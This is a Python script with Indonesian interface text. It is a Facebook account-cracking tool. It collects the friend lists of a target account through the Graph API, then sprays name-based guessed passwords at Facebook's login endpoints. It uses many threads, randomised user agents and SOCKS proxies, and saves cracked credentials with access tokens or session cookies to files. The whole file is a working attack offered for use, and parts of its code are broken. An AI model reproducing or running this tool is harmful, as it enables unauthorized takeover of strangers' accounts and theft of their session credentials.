import os, sys, re, time, requests, calendar, random, json, uuid, string
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import date,datetime

H = "\x1b[1;92m" # HIJAU
K = "\x1b[1;93m" # KUNING
N = "\x1b[0m"	# WARNA MATI

ses = requests.Session()
loop = 0
id,ok,cp = [],[],[]
data,data2 = {},{}
ugent1,ugent2 = [],[]

for useragent in range(100):
	ua1 = f"Mozilla/5.0 (Linux; U; Android {random.choice(['6','7','8','9','10','11','12'])};  en-us; GT-{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randrange(1, 999)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randrange(73,100)}.0.{random.randrange(4200,4900)}.{random.randrange(40,150)} Mobile Safari/537.36"
	ugent1.append(ua1)
	ua2= f"Mozilla/5.0 (Symbian/3; Series60/{random.randrange(1, 9)}.{random.randrange(1, 9)} Nokia{random.randrange(100, 9999)}/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/{random.randrange(1, 9)}.{random.randrange(1, 4)}.{random.randrange(1, 4)}.{random.randrange(1, 4)} Mobile Safari/535.1"
	ugent2.append(ua2) 

def bersih_layar():
	if "linux" in sys.platform.lower():
		try:os.system("clear")
		except:pass
	elif "win" in sys.platform.lower():
		try:os.system("cls")
		except:pass
	else:
		try:os.system("clear")
		except:pass
		
def hapus():
	try:os.remove("token.txt")
	except:pass
	try:os.remove("cookie.txt")
	except:pass
	
def login():
	bersih_layar()
	print("gaperlu logo yang penting cintaku padamu <3")
	print("──────────────────────────────────────────")
	cookie = input(" [+] cookie : ")
	try:
		data = ses.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie})
		find_token = re.search("(EAAG\w+)", data.text)
		print(f"\n [+] token : {find_token.group(1)}")
		open("token.txt", "w").write(find_token.group(1))
		open("cookie.txt", "w").write(cookie)
		menu()
	except Exception as e:
		exit(e)

def menu():
	try:
		cok = open("cookie.txt", "r").read()
		cookie = {"cookie":cok}
		token = open("token.txt", "r").read()
		url = ses.get(f"https://graph.facebook.com/me?fields=name,id,birthday&access_token={token}",cookies=cookie).json();nama = url["name"];user = url["id"];ttl = url["birthday"]
	except Exception as e:
		hapus()
		login()
	bersih_layar()
	print(" Gaperlu logo yg penting cintaku padamu <3")
	print("──────────────────────────────────────────")
	print(f" Nama	    : {nama}")
	print(f" ID         : {user}")
	print(f" Tgl. Lahir : {ttl}")
	print("──────────────────────────────────────────")
	print(" [1]. crack teman/publik")
	print(" [2]. lihat akun hasil crack")
	print(" [3]. logout (hapus login)")
	print("──────────────────────────────────────────")
	ask = input(" [?] pilih menu : ")
	if ask in["1"]:
		publik(token,cookie)
	elif ask in["2"]:
		print("\n [1] lihat akun hasil crack ok")
		print(" [2] lihat akun hasil crack cp")
		hasil = input("\n [?] pilih : ")
		if hasil in["1"]:
			try:hasilok = open("ok.txt").read().splitlines()
			except:exit(f" [!] tidak ada file ok, silahkan crack dulu")
			print(" [#] ----------------------------------------------")
			print(f" [+] total akun hasil crack ok : {len(hasilok)}")
			print(f" [#] ----------------------------------------------{H}")
			os.system("cat ok.txt")
			exit(f"\n\n {N}[#] selesai cek ...")
		elif hasil in["2"]:
			try:hasilcp = open("ok.txt").read().splitlines()
			except:exit(f" [!] tidak ada file cp, silahkan crack dulu")
			print(" [#] ----------------------------------------------")
			print(f" [+] total akun hasil crack ok : {len(hasilcp)}")
			print(f" [#] ----------------------------------------------{K}")
			os.system("cat cp.txt")
			exit(f"\n\n {N}[#] selesai cek ...")
		else:menu()
	elif ask in["3"]:
		hapus()
		print("──────────────────────────────────────────")
		exit(" [✓] berhasil menghapus token ")
	else:menu() 

def publik(token,cookie):
	idt=input(" [?] masukkan id : ")
	if idt in[""]:
		menu()
	print("──────────────────────────────────────────")
	print(""" [1] crack semua id new dan old
 [2] crack id new 10007-10008
 [3] crack id old 10 digit kebawah""")
	print("──────────────────────────────────────────")
	ask = input(" [?] pilih : ")
	if ask in["1"]:
		try:
			for i in ses.get(f"https://graph.facebook.com/{idt}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
				id.append(i["id"]+"<=>"+i["name"])
		except KeyError:
			exit(" [!] akun tidak tersedia atau list teman private")
	elif ask in["2"]:
		try:
			for i in ses.get(f"https://graph.facebook.com/{idt}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
				if i["id"][:5] in ["10008"] or i["id"][:5] in ["10007"]:
					id.append(i["id"]+"<=>"+i["name"])
		except KeyError:
			exit(" [!] akun tidak tersedia atau list teman private")
	elif ask in["3"]:
		try:
			for i in ses.get(f"https://graph.facebook.com/{idt}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
				if len(i["id"])==7 or len(i["id"])==8 or len(i["id"])==9 or len(i["id"])==10:
					id.append(i["id"]+"<=>"+i["name"])
		except KeyError:
			exit(" [!] akun tidak tersedia atau list teman private")
	atursandi()
		
def atursandi():
	print("──────────────────────────────────────────")
	print(f" [+] total id terkumpul : {len(id)}")
	print("──────────────────────────────────────────")
	print(" [1] otomatis  [2] manual  [3] gabungkan")
	ask=input(" [?] pilih : ")
	if ask in[""]:
		menu()
	elif ask in["1"]:
		otomatis()
	elif ask in["2"]:
		manual()
	elif ask in["3"]:
		gabungkan()
	else:
		exit()

def otomatis():
	print("──────────────────────────────────────────")
	print(" [1]. metode API")
	print(" [2]. metode mobile")
	print("──────────────────────────────────────────")
	ask=input(" [?] pilih : ")
	if ask=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif ask=="1":
		print(" [+] hasil OK disimpan ke -> ok.txt")
		print(" [+] hasil CP disimpan ke -> cp.txt")
		print("──────────────────────────────────────────")
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				user, name = user.split("<=>")
				nam = name.split(" ")
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				fall.submit(api, user, pwx)
		exit("\n\n [#] crack selesai...")
	elif ask=="2":
		print(" [+] hasil OK disimpan ke -> ok.txt")
		print(" [+] hasil CP disimpan ke -> cp.txt")
		print("──────────────────────────────────────────")
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				user, name = user.split("<=>")
				nam = name.split(" ")
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				fall.submit(crack, user, pwx)
		exit("\n\n [#] crack selesai...")
		

def manual():
	print("──────────────────────────────────────────")
	print(" [!] gunakan , (koma) sebagai pemisah")
	pwek=input(" [?] buat kata sandi : ")
	if pwek=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif len(pwek)<=5:
		exit(" %s[!] masukan sandi minimal 6 angka!"%(M))
	print("──────────────────────────────────────────")
	print(" [1]. metode API")
	print(" [2]. method mobile")
	print("──────────────────────────────────────────")
	ask=input(" [?] pilih : ")
	if ask=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif ask=="1":
		print(" [+] hasil OK disimpan ke -> ok.txt")
		print(" [+] hasil CP disimpan ke -> cp.txt")
		print("──────────────────────────────────────────")
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				user, name = user.split("<=>")
				fall.submit(api, user, pwek.split(","))
		exit("\n\n [#] crack selesai...")
	elif ask=="2":
		print(" [+] hasil OK disimpan ke -> ok.txt")
		print(" [+] hasil CP disimpan ke -> cp.txt")
		print("──────────────────────────────────────────")
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				user, name = user.split("<=>")
				fall.submit(crack, user, pwek.split(","))
		exit("\n\n [#] crack selesai...")
		

def gabungkan():
	print("──────────────────────────────────────────")
	print(" [!] sandi bawaan nama123,1234,12345")
	print(" [!] gunakan , (koma) sebagai pemisah")
	pwek=input(" [?] sandi gabungan : ")
	if pwek=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif len(pwek)<=5:
		exit(" %s[!] masukan sandi minimal 6 angka!"%(M))
	print("──────────────────────────────────────────")
	print(" [1]. method API")
	print(" [2]. method mobile")
	print("──────────────────────────────────────────")
	ask=input(" [?] pilih : ")
	if ask=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif ask=="1":
		print(" [+] hasil OK disimpan ke -> ok.txt")
		print(" [+] hasil CP disimpan ke -> cp.txt")
		print("──────────────────────────────────────────")
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				user, name = user.split("<=>")
				nam = name.split(" ")
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345",pwek.split(",")]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345",pwek.split(",")]
				fall.submit(api, user, pwx)
		exit("\n\n [#] crack selesai...")
	elif ask=="2":
		print(" [+] hasil OK disimpan ke -> ok.txt")
		print(" [+] hasil CP disimpan ke -> cp.txt")
		print("──────────────────────────────────────────")
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				user, name = user.split("<=>")
				nam = name.split(" ")
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345",pwek.split(",")]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345",pwek.split(",")]
				fall.submit(crack, user, pwx)
		exit("\n\n [#] crack selesai...")
	

def api(user, pwx):
	global ok, cp, loop, token
	prox = open("proxy.txt","r").read().splitlines()
	sys.stdout.write(f"\r {N}[+] [crack] {loop}/{len(id)}  OK : {len(ok)} - CP : {len(cp)} "); sys.stdout.flush()
	try:
		for pw in pwx:
			pw = pw.lower()
			ugent = random.choice([
				"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36",
				"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
				"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
				"Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16';]"
				"Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36;]"
				])
			proxy= {"http": "socks5://{random.choice(prox)}"}
			data={
				"adid": str(uuid.uuid4()),
				"format": "json",
				"device_id": str(uuid.uuid4()),
				"email":user,
				"password":pw,
				"cpl": "true",
				"family_device_id": str(uuid.uuid4()),
				"credentials_type": "device_based_login_password",
				"generate_session_cookies":"1",
				"error_detail_type": "button_with_disabled",
				"source": "device_based_login",
				"machine_id": "".join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(24)),
				"meta_inf_fbmeta": "",
				"advertiser_id": str(uuid.uuid4()),
				"currently_logged_in_userid": "0",
				"locale": "en_US",
				"client_country_code": "US",
				"method": "auth.login",
				"fb_api_req_friendly_name": "authenticate",
				"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
				"api_key": "882a8490361da98702bf97a021ddc14d",
				"sig":"62f8ce9f74b12f84c123cc23437a4a32"
				}
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(2e7, 3e7)),
				"x-fb-sim-hni": str(random.randint(2e4, 4e4)),
				"x-fb-net-hni": str(random.randint(2e4, 4e4)),
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ugent,
				"content-type": "application/x-www-form-urlencoded",
				"x-fb-http-engine": "Liger"
				}
			post=ses.post("https://graph.facebook.com/auth/login",data=data,headers=headers,proxies=proxy)
			if "session_key" in post.text and "EAAA" in post.text:
				ok.append(user)
				print(f"\r {H}[OK] {user}|{pw}|{post.json()['access_token']}")
				open("ok.txt","a").write(f" [OK] {user}|{pw}|{post.json()['access_token']}\n")
				break
			elif "User must verify their account" in post.text:
				cp.append(user)
				print(f"\r {K}[CP] {user}|{pw}		")
				url = parser(ses.get("https://mbasic.facebook.com/login.php").text,"html.parser")
				for x in url.find_all("input"):
					data.update({x.get("name"):x.get("value")})
				data.update({"email":user,"pass":pw})
				post1 = ses.post("https://mbasic.facebook.com/login.php",data=data)
				parsing1 = parser(post.text,"html.parser")
				action1 = parsing1.find("form",{"method":"post"})["action"]
				tampung = ["fb_dtsg","jazoest","checkpoint_data","submit[Continue]","nh"]
				for x in parsing1.find_all("input"):
					if x.get("name") in tampung:
						data2.update({x.get("name"):x.get("value")})
					else:continue
				post2 = ses.post("https://mbasic.facebook.com"+action1, data=data2)
				parsing2 = parser(post2.text,"html.parser")
				option = parsing2.find_all("option")
				if len(option) == 0:
					print("tidak ada opsi atau mungkin tap yes")
				else:
					z = 0
					print(f" [+] terdeteksi {len(option)} opsi :")
					for opsi in option:
						z+=1
						print(f"  [{z}]. {opsi.text}")
				open("cp.txt","a").write(f" [CP] {user}|{pw}\n")
				break
			else:continue
		loop += 1
	except Exception as e:
		time.sleep(32)


def crack(user, pwx):
	global ok, cp, loop, token
	prox = open("proxy.txt","r").read().splitlines()
	ua1 = random.choice(ugent1)
	ua2 = random.choice(ugent2)
	sys.stdout.write(f"\r {N}[+] [crack] {loop}/{len(id)}  OK : {len(ok)} - CP : {len(cp)} "); sys.stdout.flush()
	try:
		for pw in pwx:
			dat = {}
			pw = pw.lower()
			proxy= {"http": "socks5://{random.choice(prox)}"}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua1,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			url = ses.get(f"https://m.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin")
			data = {"lsd":re.search('name="lsd" value="(.*?)"', str(url.text)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"uid":user,"flow":"login_no_pin","pass": pw,"next": "https://m.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr"}
			coki = (";").join([ "%s=%s" % (key, value) for key, value in url.cookies.get_dict().items() ])
			coki+=" m_pixel_ratio=2.625; wd=412x756"
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua1,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': f'https://m.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID", data=data,cookies={"cookie": coki},headers=heade,allow_redirects=False,proxies=proxy)
			if "c_user" in ses.cookies.get_dict().keys():
				ok.append(user)
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
				print(f"\r {H}[OK] {user}|{pw}|{kuki}")
				open("ok.txt","a").write(f" [OK] {user}|{pw}|{kuki}\n")
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				cp.append(user)
				print(f"\r {K}[CP] {user}|{pw}		")
				url = parser(ses.get("https://mbasic.facebook.com/login.php").text,"html.parser")
				for x in url.find_all("input"):
					data.update({x.get("name"):x.get("value")})
				data.update({"email":user,"pass":pw})
				post1 = ses.post("https://mbasic.facebook.com/login.php",data=data)
				parsing1 = parser(post.text,"html.parser")
				action1 = parsing1.find("form",{"method":"post"})["action"]
				tampung = ["fb_dtsg","jazoest","checkpoint_data","submit[Continue]","nh"]
				for x in parsing1.find_all("input"):
					if x.get("name") in tampung:
						data2.update({x.get("name"):x.get("value")})
					else:continue
				post2 = ses.post("https://mbasic.facebook.com"+action1, data=data2)
				parsing2 = parser(post2.text,"html.parser")
				option = parsing2.find_all("option")
				if len(option) == 0:
					print("tidak ada opsi atau mungkin tap yes")
				else:
					z = 0
					print(f" [+] terdeteksi {len(option)} opsi :")
					for opsi in option:
						z+=1
						print(f"  [{z}]. {opsi.text}")
				open("cp.txt","a").write(f" [CP] {user}|{pw}\n")
				break
			else:continue
		loop+=1
	except Exception as e:
		time.sleep(32)
		
if __name__=="__main__":
	os.system("git pull")
	menu()
